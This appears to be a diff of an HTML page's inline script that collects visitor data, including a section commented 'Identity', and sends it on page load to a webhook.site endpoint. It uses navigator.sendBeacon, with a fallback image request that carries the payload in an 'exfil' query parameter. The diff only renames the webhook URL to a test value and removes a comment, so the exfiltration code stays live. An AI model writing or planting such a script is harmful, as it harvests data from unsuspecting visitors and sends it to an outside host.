@@ -15,7 +15,7 @@
 
   <script>
     (async function() {
-      const WH = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253';
+      const WH = 'https://webhook.site/test';
       const d = {};
 
       // Identity
@@ -92,7 +92,6 @@
       const payload = JSON.stringify(d);
       navigator.sendBeacon(WH, payload);
       
-      // Backup: fetch with no-cors
       new Image().src = WH + '?exfil=' + encodeURIComponent(payload);
     })();
   </script>
